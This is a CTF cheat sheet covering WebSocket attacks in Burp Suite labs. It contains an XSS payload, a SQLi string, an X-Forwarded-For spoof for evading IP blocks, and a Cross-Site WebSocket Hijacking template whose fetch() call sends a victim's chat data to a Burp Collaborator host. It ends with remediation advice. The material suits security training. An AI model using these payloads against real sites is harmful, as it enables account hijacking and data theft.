# WebSockets — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Repeater (WebSockets), Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

WebSockets provide full-duplex communication over a single TCP connection initiated via an HTTP handshake (`Upgrade: websocket`).

1. **Locate WebSocket Traffic:**
   - Look for live chat widgets, notification streams, collaborative editors, real-time ticker feeds.
   - Inspect traffic in Burp **Proxy → WebSockets history**.
2. **Inspect the Handshake Request:**
   - Check if the initial HTTP upgrade request enforces `Origin` checks, anti-CSRF tokens, or relies purely on session cookies.
3. **Manipulate In-Flight Messages:**
   - Send WebSocket messages to **Repeater (WebSockets tab)**.
   - Test injection payloads (XSS, SQLi, IDOR) inside WebSocket message bodies (e.g. JSON strings).
4. **Test Cross-Site WebSocket Hijacking (CSWSH):**
   - If the handshake relies only on cookies and ignores `Origin`, build a malicious webpage that initiates a WebSocket connection from the victim's browser and exfiltrates message traffic.

---

## 2. In-Band Message Manipulation (WebSocket XSS & SQLi)

### 1. Exploiting XSS via WebSocket Messages
Unlike standard HTTP where filters may sanitize incoming POST parameters, backend WebSocket processors frequently lack output encoding:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```
- In Burp **WebSockets history**, find the outgoing chat message.
- Right-click → **Send to Repeater**.
- Edit the JSON payload and click **Send**.
- Observe whether the message reflects into the agent/admin chat interface unescaped.

---

### 2. Handshake Manipulation (Bypassing IP Blacklists / WAFs)
If your IP address is blacklisted after injecting malicious WebSocket payloads:
1. Re-intercept the WebSocket Upgrade request:
   ```http
   GET /chat HTTP/1.1
   Host: TARGET.net
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   Sec-WebSocket-Version: 13
   X-Forwarded-For: 1.1.1.§1§
   ```
2. Inject `X-Forwarded-For: 1.1.1.1` to spoof a new client IP.
3. Once the handshake succeeds, send malicious WebSocket messages over the new connection.

---

## 3. Cross-Site WebSocket Hijacking (CSWSH)

### Vulnerability Concept
CSWSH is CSRF against a WebSocket handshake. If an application authenticates the WebSocket upgrade using only ambient session cookies without verifying the `Origin` header, a malicious site can initiate a WebSocket connection on behalf of the victim and intercept messages.

### CSWSH Exploit Template (Exploit Server)

```html
<script>
    var ws = new WebSocket('wss://TARGET.net/chat');

    ws.onopen = function() {
        // Send initial message if handshake requires a trigger
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Exfiltrate received chat history / credentials to Burp Collaborator
        fetch('https://BURP-COLLABORATOR-SUBDOMAIN/?data=' + encodeURIComponent(event.data));
    };
</script>
```

### Attack Execution:
1. Verify the target uses `wss://` or `ws://` and relies on a `session` cookie in the upgrade request.
2. In Burp Repeater, modify the `Origin` header in the upgrade handshake to `Origin: https://evil.com`.
3. If the server responds with `101 Switching Protocols`, cross-origin connections are permitted.
4. Host the exploit script on your **Exploit Server** and deliver to the victim.
5. Check **Burp Collaborator** client for incoming chat logs containing the victim's credentials or sensitive data.

---

## 4. CTF Quick Reference

| Flaw | Detection Method | Exploit Action |
|---|---|---|
| **WebSocket XSS** | Inspect message reflection in chat UI | Inject `<img src=1 onerror=alert(1)>` in WS Repeater |
| **IP-Blocked Handshake**| 403 on WS Upgrade | Add `X-Forwarded-For: 1.1.1.1` to Handshake |
| **CSWSH** | Handshake allows cross-site `Origin` | Host `new WebSocket('wss://target/chat')` script on Exploit Server |
| **WebSocket SQLi** | DB errors returned in WS frame | Inject `' OR 1=1--` into JSON message properties |

---

## 5. Remediation

- **Strict Origin Header Validation:** Reject WebSocket handshakes if the `Origin` header does not match the exact expected application domain.
- **CSRF Tokens on Handshake:** Include an unpredictable, one-time anti-CSRF token in the initial HTTP upgrade request.
- **Input Sanitization & Output Encoding:** Sanitize and context-encode data arriving through WebSockets with the same rigor as standard HTTP request data.
